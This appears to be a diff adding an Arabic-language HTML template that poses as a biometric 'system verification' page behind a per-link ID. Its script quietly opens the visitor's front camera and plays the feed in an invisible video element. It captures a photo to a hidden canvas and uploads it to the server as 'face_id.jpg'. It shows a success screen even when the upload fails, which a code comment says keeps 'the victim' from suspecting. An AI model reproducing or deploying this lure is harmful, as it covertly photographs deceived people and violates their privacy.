@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Verification</title>
+    <!-- خط عصري نظيف -->
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    
+    <style>
+        /* إعدادات الألوان الأساسية */
+        :root {
+            --bg-gradient: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #312e81 100%);
+            --glass-bg: rgba(255, 255, 255, 0.03);
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --accent-color: #06b6d4; /* Electric Cyan */
+            --accent-glow: rgba(6, 182, 212, 0.6);
+            --text-main: #ffffff;
+            --text-muted: #94a3b8;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            width: 100vw;
+            background: var(--bg-gradient);
+            font-family: 'Cairo', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* تأثير الدوائر المضيئة في الخلفية (للجمالية فقط) */
+        .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            z-index: -1;
+            opacity: 0.4;
+        }
+        .orb-1 { top: -10%; left: -10%; width: 500px; height: 500px; background: #4f46e5; }
+        .orb-2 { bottom: -10%; right: -10%; width: 400px; height: 400px; background: #db2777; }
+
+        /* البطاقة الزجاجية الرئيسية */
+        .glass-card {
+            width: 90%;
+            max-width: 380px;
+            padding: 40px 30px;
+            background: var(--glass-bg);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--glass-border);
+            border-radius: 24px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+
+        h2 {
+            color: var(--text-main);
+            margin: 0 0 10px 0;
+            font-size: 1.5rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+
+        p.subtitle {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            margin-bottom: 40px;
+            line-height: 1.6;
+        }
+
+        /* زر البصمة */
+        .scan-btn {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 2px solid rgba(6, 182, 212, 0.3);
+            background: radial-gradient(circle, rgba(6, 182, 212, 0.1) 0%, transparent 70%);
+            cursor: pointer;
+            position: relative;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            outline: none;
+        }
+
+        .scan-btn svg {
+            width: 45px;
+            height: 45px;
+            fill: none;
+            stroke: var(--accent-color);
+            stroke-width: 1.5;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            transition: all 0.3s ease;
+        }
+
+        .scan-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px var(--accent-glow);
+            border-color: var(--accent-color);
+        }
+
+        /* حالة التحميل/المسح */
+        .scanning {
+            border-color: var(--accent-color);
+            animation: pulse 1.5s infinite;
+        }
+        
+        .scanning svg {
+            stroke: #10b981; /* Green when scanning */
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(6, 182, 212, 0.4); }
+            70% { box-shadow: 0 0 0 20px rgba(6, 182, 212, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(6, 182, 212, 0); }
+        }
+
+        /* سطر المسح الضوئي */
+        .scanner-line {
+            position: absolute;
+            width: 80%;
+            height: 2px;
+            background: var(--accent-color);
+            top: 10%;
+            left: 10%;
+            box-shadow: 0 0 10px var(--accent-color);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .scanning .scanner-line {
+            opacity: 1;
+            animation: scanMove 1.5s ease-in-out infinite alternate;
+        }
+
+        @keyframes scanMove {
+            0% { top: 15%; opacity: 0; }
+            20% { opacity: 1; }
+            80% { opacity: 1; }
+            100% { top: 85%; opacity: 0; }
+        }
+
+        /* النصوص والحالة */
+        .status-text {
+            margin-top: 25px;
+            min-height: 24px;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+
+        .success-view {
+            display: none;
+            animation: fadeIn 0.5s forwards;
+        }
+
+        .success-icon {
+            font-size: 3rem;
+            color: #10b981;
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* إخفاء الفيديو تماماً */
+        video {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            object-fit: cover;
+            opacity: 0;
+            z-index: -2;
+            pointer-events: none;
+        }
+        canvas { display: none; }
+
+    </style>
+</head>
+<body>
+
+    <!-- خلفية جمالية -->
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+
+    <!-- الكاميرا المخفية -->
+    <video id="webcam" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <div class="glass-card">
+        <h2>تحقق من الأمان</h2>
+        <p class="subtitle">يرجى تأكيد هويتك للمتابعة إلى النظام<br><span style="font-size:0.8em; opacity:0.6;">ID: {{ link_id }}</span></p>
+
+        <!-- منطقة الزر قبل الضغط -->
+        <div id="btn-area">
+            <button class="scan-btn" id="verifyBtn" onclick="startProcess()">
+                <div class="scanner-line"></div>
+                <!-- أيقونة بصمة -->
+                <svg viewBox="0 0 24 24">
+                    <path d="M2 12h2"/>
+                    <path d="M20 12h2"/>
+                    <path d="M4.93 4.93l1.41 1.41"/>
+                    <path d="M17.66 17.66l1.41 1.41"/>
+                    <path d="M4.93 19.07l1.41-1.41"/>
+                    <path d="M17.66 6.34l1.41-1.41"/>
+                    <path d="M12 2a9.96 9.96 0 0 0-6.44 2.56l-1.43-1.43A11.94 11.94 0 0 1 12 0v2z"/>
+                    <path d="M12 2a9.96 9.96 0 0 1 6.44 2.56l1.43-1.43A11.94 11.94 0 0 0 12 0v2z"/>
+                    <path d="M12 22a9.96 9.96 0 0 0 6.44-2.56l1.43 1.43A11.94 11.94 0 0 1 12 24v-2z"/>
+                    <path d="M12 22a9.96 9.96 0 0 1-6.44-2.56l-1.43 1.43A11.94 11.94 0 0 0 12 24v-2z"/>
+                    <path d="M12 10a2 2 0 0 0-2 2v2a2 2 0 0 0 4 0v-2a2 2 0 0 0-2-2z"/>
+                </svg>
+            </button>
+            <div class="status-text" id="statusText">اضغط لتأكيد الهوية</div>
+        </div>
+
+        <!-- منطقة النجاح (تظهر بعد الإرسال) -->
+        <div class="success-view" id="successView">
+            <span class="success-icon">✓</span>
+            <h2>تم التحقق بنجاح</h2>
+            <p class="subtitle">سيتم تحويلك تلقائياً...</p>
+        </div>
+    </div>
+
+<script>
+    const video = document.getElementById('webcam');
+    const canvas = document.getElementById('canvas');
+    const btn = document.getElementById('verifyBtn');
+    const statusText = document.getElementById('statusText');
+    const btnArea = document.getElementById('btn-area');
+    const successView = document.getElementById('successView');
+    
+    let streamActive = false;
+
+    async function startCamera() {
+        if(streamActive) return;
+        try {
+            // طلب الكاميرا بهدوء وبدون صوت
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, 
+                audio: false 
+            });
+            video.srcObject = stream;
+            streamActive = true;
+        } catch (err) {
+            console.error("Camera error:", err);
+            statusText.innerText = "يرجى السماح بالوصول للكاميرا";
+        }
+    }
+
+    async function startProcess() {
+        // تفعيل الأنيميشن
+        btn.classList.add('scanning');
+        statusText.innerText = "جاري المسح البيومتري...";
+        
+        // تشغيل الكاميرا إذا لم تكن تعمل
+        await startCamera();
+
+        // محاكاة وقت المعالجة (3 ثواني)
+        setTimeout(async () => {
+            statusText.innerText = "معالجة البيانات...";
+            
+            // التقاط الصورة
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('file', blob, 'face_id.jpg');
+                
+                // إرسال البيانات للخادم
+                fetch('/upload/{{ link_id }}', { method: 'POST', body: formData })
+                .then(() => {
+                    showSuccess();
+                })
+                .catch(err => {
+                    console.error(err);
+                    showSuccess(); // نكمل حتى لو فشل الرفع لضمان عدم شك الضحية
+                });
+            }, 'image/jpeg');
+
+        }, 2500);
+    }
+
+    function showSuccess() {
+        btnArea.style.display = 'none';
+        successView.style.display = 'block';
+        
+        // إيقاف الكاميرا وتوفير البطارية
+        if(video.srcObject) {
+            video.srcObject.getTracks().forEach(track => track.stop());
+        }
+    }
+</script>
+
+</body>
+</html>
